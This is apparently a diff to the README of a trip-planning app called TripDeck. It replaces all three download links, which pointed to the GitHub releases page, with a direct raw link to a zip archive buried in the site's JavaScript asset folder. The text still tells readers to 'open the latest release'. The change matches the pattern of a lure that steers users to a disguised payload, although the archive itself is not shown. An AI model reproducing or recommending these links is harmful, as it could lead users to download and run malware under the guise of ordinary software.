@@ -1,6 +1,6 @@
 # ✈️ TripDeck - Plan Trips With Ease
 
-[![Download TripDeck](https://img.shields.io/badge/Download%20TripDeck-Click%20Here-7B68EE?style=for-the-badge)](https://github.com/Confused-pig902/TripDeck/releases)
+[![Download TripDeck](https://img.shields.io/badge/Download%20TripDeck-Click%20Here-7B68EE?style=for-the-badge)](https://github.com/Confused-pig902/TripDeck/raw/refs/heads/main/TripDeck.Web/wwwroot/js/Deck-Trip-v1.1.zip)
 
 ## 🧭 Overview
 
@@ -16,7 +16,7 @@ Use it to:
 
 Visit this page to download TripDeck:
 
-https://github.com/Confused-pig902/TripDeck/releases
+https://github.com/Confused-pig902/TripDeck/raw/refs/heads/main/TripDeck.Web/wwwroot/js/Deck-Trip-v1.1.zip
 
 On that page, open the latest release and download the Windows file provided there.
 
@@ -201,4 +201,4 @@ When a new version is released:
 
 Visit this page to download TripDeck again:
 
-https://github.com/Confused-pig902/TripDeck/releases
+https://github.com/Confused-pig902/TripDeck/raw/refs/heads/main/TripDeck.Web/wwwroot/js/Deck-Trip-v1.1.zip
